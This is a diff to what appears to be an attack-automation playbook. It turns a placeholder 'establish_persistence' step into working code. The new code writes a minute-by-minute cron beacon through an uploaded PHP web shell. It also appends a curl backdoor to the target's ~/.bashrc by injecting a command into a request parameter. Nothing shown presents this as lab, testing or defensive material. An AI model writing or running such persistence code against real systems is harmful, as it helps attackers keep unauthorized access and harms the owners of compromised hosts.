@@ -74,10 +74,18 @@ steps:
       esac
 
   - name: establish_persistence
-    description: Create mechanisms for persistent access
+    description: Create a persistence mechanism via cron and bash profile on the target
     inline: |
-      echo "[*] Establishing persistence"
-      echo "[*] Would execute reverse shell for persistent access"
+      echo "[*] Establishing persistence via web shell"
+      base_url="${target_url%/*}"
+      # Attempt to write a cron-based callback via the RCE
+      cron_payload="echo '* * * * * curl -s ${base_url}/beacon 2>/dev/null' | crontab -"
+      encoded=$(echo "${cron_payload}" | jq -sRr @uri)
+      curl -s "${base_url}${upload_directory:-/uploads}/malicious.php?cmd=${encoded}" 2>&1 | head -10 || true
+      # Attempt to write a shell profile backdoor
+      profile_payload="echo 'curl -s ${base_url}/beacon &' >> ~/.bashrc"
+      encoded2=$(echo "${profile_payload}" | jq -sRr @uri)
+      curl -s "${target_url}?${param_name}=$(echo "; ${profile_payload}" | jq -sRr @uri)" 2>&1 | head -10 || true
 
   - name: rce_execution_check
     description: Verify code execution on target
